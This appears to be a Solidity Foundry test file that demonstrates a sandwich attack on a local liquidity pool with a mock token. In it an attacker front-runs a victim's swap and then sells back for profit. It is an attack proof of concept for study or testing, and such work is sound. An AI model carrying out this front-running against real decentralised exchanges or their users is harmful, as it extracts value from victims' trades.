// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "src/Pool.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract SandwichAttack is Test {
    Pool public pool;
    MockToken public token;

    function setUp() public {
        token = new MockToken();
        pool = new Pool(token);

        // Set reserves
        vm.deal(address(pool), 10000); // ETH: 10000
        deal(address(token), address(pool), 50000); // ERC20 Token: 50000
    }

    function test_sandwichAttack() public {
        address victim = makeAddr("victim");
        address attacker = makeAddr("attacker");

        vm.deal(address(victim), 1000);
        vm.deal(address(attacker), 1000);

        uint expectedAmount = expectedTokens(1000);

        // 1. Attacker identifies a victim swap operation and front-runs it
        vm.prank(attacker);
        pool.swapEthForToken{value: 1000}();

        // 2. Victim swap occurs after the attacker transaction, resulting in a high slippage
        vm.prank(victim);
        pool.swapEthForToken{value: 1000}();

        // 3. Attacker sells its token for a higher price and get its profit
        vm.startPrank(attacker);
        token.approve(address(pool), 1e18);
        pool.swapTokenForEth(token.balanceOf(attacker));
        vm.stopPrank();

        console.log("Victim SWAP expected amount: ", expectedAmount);
        console.log("Victim SWAP amount received: ", token.balanceOf(victim));
        console.log("Attacker's balance (before the sandwich attack): 1000");
        console.log("Attacker's balance (after the sandwich attack)", attacker.balance);
    }

    function expectedTokens(uint _ethAmount) internal returns(uint) {
        (uint256 x, uint256 y) = pool.getReserves();
        x += _ethAmount;
        uint256 beta = _ethAmount * y / (x + _ethAmount);
        return beta;
    }
}

contract MockToken is ERC20 {
    constructor() ERC20("MockToken", "MTK") {
        _mint(msg.sender, 1000000 * 18 ** decimals());
    }
}